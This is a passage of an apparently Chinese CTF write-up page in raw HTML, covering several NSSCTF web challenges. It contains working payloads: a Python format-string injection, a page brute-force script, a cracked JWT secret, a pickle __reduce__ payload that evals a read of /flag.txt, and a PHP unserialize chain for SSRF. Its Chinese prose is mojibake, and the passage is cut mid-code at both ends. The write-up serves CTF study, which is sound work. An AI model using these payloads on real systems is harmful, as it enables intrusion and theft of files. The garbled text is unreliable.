class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">detele</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;c75690ab-7f71-4249-9591-3604d9b33f33&#125;</span><br></pre></td></tr></table></figure><h2 id="MoeCTF-2021-åœ°ç‹±é€šè®¯"><a href="#MoeCTF-2021-åœ°ç‹±é€šè®¯" class="headerlink" title="[MoeCTF 2021]åœ°ç‹±é€šè®¯"></a>[MoeCTF 2021]åœ°ç‹±é€šè®¯</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162221344.png" alt="image-20241217162221344"></p><p>æ•´ç†å¾—åˆ°å¦‚ä¸‹æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request </span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag, FLAG </span><br><span class="line"><span class="keyword">import</span> datetime </span><br><span class="line">app = Flask(__name__) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r&quot;</span>) </span><br><span class="line">ctx = f.read() </span><br><span class="line">f.close() </span><br><span class="line"></span><br><span class="line">f1ag = request.args.get(<span class="string">&#x27;f1ag&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span> </span><br><span class="line">exp = request.args.get(<span class="string">&#x27;exp&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span> </span><br><span class="line">flAg = FLAG(f1ag) </span><br><span class="line">message = <span class="string">&quot;Your flag is &#123;0&#125;&quot;</span> + exp </span><br><span class="line"><span class="keyword">if</span> exp == <span class="string">&quot;&quot;</span>: </span><br><span class="line"><span class="keyword">return</span> ctx </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line"><span class="keyword">return</span> message.<span class="built_in">format</span>(flAg) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: app.run() </span><br></pre></td></tr></table></figure><p>å…³é”®çš„åˆ©ç”¨ç‚¹åœ¨message.format(flAg)å’Œmessage &#x3D; â€œYour flag is {0}â€ + exp </p><p>è€ƒç‚¹ä¸å‡ºæ„å¤–å°±æ˜¯formatå‡½æ•°</p><p>è¿™å…¶å®å¯ä»¥çœ‹åšæ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Your flag is flAg&quot; + exp </span><br></pre></td></tr></table></figure><p>ï¼Œåé¢è¿˜æœ‰ä¸ªexpå¯æ§ï¼Œæˆ‘ä»¬è®©ä»–ä¹Ÿä¸º{}ï¼Œé‚£ä¹ˆè¿™ä¸ªå†…å®¹å°±å¯æ§äº†</p><p><img src="http://49.232.222.195/usr/uploads/2024/01/3143471657.png" alt="2024-01-24T10:25:56.png"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162431715.png" alt="image-20241217162431715"></p><p>é‚£ä¹ˆæˆ‘ä»¬è®©expä¸ºå¦‚ä¸‹è¯•è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;0.__class__&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162525349.png" alt="image-20241217162525349"></p><p>æˆåŠŸï¼Œæ¥ä¸‹æ¥çœ‹globalså³å¯ã€‚</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162550738.png" alt="image-20241217162550738" style="zoom: 67%;" /><h2 id="CISCN-2019ååŒ—Day1-Web2"><a href="#CISCN-2019ååŒ—Day1-Web2" class="headerlink" title="[CISCN 2019ååŒ—Day1]Web2"></a>[CISCN 2019ååŒ—Day1]Web2</h2><p>æ³¨å†Œä¸€ä¸ªè´¦å·ç„¶åç™»é™†è¿›å…¥å°±è¡Œã€‚</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217183017666.png" alt="image-20241217183017666"></p><p>ikunä»¬å†²å‘€ï¼Œä¸€å®šè¦ä¹°åˆ°lv6</p><p>okï¼Œä¸‹é¢æ‰¾lv6å°±è¡Œï¼Œä½†æ˜¯ç¿»äº†å¥½å¤šé¡µéƒ½æ²¡æœ‰ï¼Œå¯èƒ½æ•°å­—å¾ˆå¤§ï¼Œæˆ‘ä»¬çˆ†ç ´ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://node4.anna.nssctf.cn:28454/shop?page=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    target=url+<span class="built_in">str</span>(i)</span><br><span class="line">    res=requests.get(target)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>180ï¼Œokæ‹¿æ</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217183108043.png" alt="image-20241217183108043" style="zoom:67%;" /><p>å¤©ä»·ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å¯èƒ½è€ƒç‚¹å°±æ˜¯æ”¯ä»˜é€»è¾‘æ¼æ´</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217183711068.png" alt="image-20241217183711068"></p><p>è¿™é‡Œéœ€è¦adminç”¨æˆ·æ‰è¡Œï¼ŒåŒæ—¶ç»™äº†jwtï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¼ªé€ jwtå°±è¡Œï¼Œè¿™é‡Œæˆ‘è¯•äº†å¾ˆå¤šæ–¹æ³•éƒ½ä¸è¡Œï¼Œåæ¥jwtcrackä¸€ä¸‹ç›´æ¥çˆ†ç ´å‡ºäº†å¯†é’¥</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217184946236.png" alt="image-20241217184946236"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1Kun</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217185044193.png" alt="image-20241217185044193"></p><p>åœ¨æºä»£ç çœ‹åˆ°<a href="http://www.zip/">www.zip</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminHandler</span>(<span class="title class_ inherited__">BaseHandler</span>):</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = <span class="variable language_">self</span>.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨admin.pyå¤„å‘ç°pickle.loadsï¼Œå­˜åœ¨pickleååºåˆ—åŒ–</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217191850648.png" alt="image-20241217191850648" style="zoom:67%;" /><p>åŒæ—¶çœ‹ä¸€ä¸‹å¯¹äºè·¯ç”±çš„é…ç½®ï¼Œå¯¹åº”çš„æ˜¯&#x2F;b1g_m4mberè·¯ç”±ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨è¿™ä¸ªè·¯ç”±ä¸‹è¿›è¡Œpickleååºåˆ—åŒ–å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cmd</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = cmd()</span><br><span class="line">c = pickle.dumps(c)</span><br><span class="line">d=urllib.quote(c)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå½“æ—¶è¯•äº†å¥½ä¹…ï¼Œåæ¥æ‰çŸ¥é“urllib.unquoteå¯¹åº”python2ç‰ˆæœ¬ï¼Œè¦ç”¨python2æ¥ï¼Œä¸èƒ½ç”¨python3ï¼ŒåŒæ—¶cmdç±»ä¸­è¦ç»§æ‰¿objectæ‰è¡Œï¼ï¼ï¼</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217194810760.png" alt="image-20241217194810760" style="zoom: 67%;" /><h2 id="SWPUCTF-2022-æ–°ç”Ÿèµ›-Power"><a href="#SWPUCTF-2022-æ–°ç”Ÿèµ›-Power" class="headerlink" title="[SWPUCTF 2022 æ–°ç”Ÿèµ›]Power!"></a>[SWPUCTF 2022 æ–°ç”Ÿèµ›]Power!</h2><p>ä¸»è¦æ˜¯å…³äºphpååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Image Viewer ~ @V@&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;This is a Image viewer&lt;/h1&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;/&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;text&quot;</span> placeholder=<span class="string">&quot;vergil.jpg&quot;</span> name=<span class="string">&quot;image_path&quot;</span>&gt;</span><br><span class="line">        &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;submit&lt;/button&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$black_list</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$local</span> = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;black_list.<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="variable">$this</span>-&gt;path);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$file</span>).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$url</span> = <span class="variable">$path</span>;</span><br><span class="line">            <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;local = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$superhacker</span> = <span class="string">&quot;hacker.jpg&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">goodman</span>(<span class="params"><span class="variable">$i</span>,<span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$i</span>-&gt;<span class="variable">$j</span> = <span class="variable language_">$this</span>-&gt;superhacker;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">goodman</span>(<span class="variable">$this</span>-&gt;a,<span class="variable">$this</span>-&gt;b);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">c</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>];    <span class="comment">//flag in /flag.php</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$path</span>)&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http:|gopher:|glob:|php:/i&quot;</span>,<span class="variable">$path</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;Seriously??&lt;/h2&gt;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;cheems.jpg&quot;</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path_info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>];</span><br><span class="line">            <span class="variable">$FV</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path_info</span>));</span><br><span class="line">            <span class="variable">$FV</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&quot;vergil.jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;POWER!!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- ?source= --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>payloadå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$black_list</span> = <span class="string">&quot;111&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$local</span> = <span class="string">&quot;http://127.0.0.1:65500/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;black_list.<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="variable">$this</span>-&gt;path);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$file</span>).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$path</span>;</span><br><span class="line">        <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span 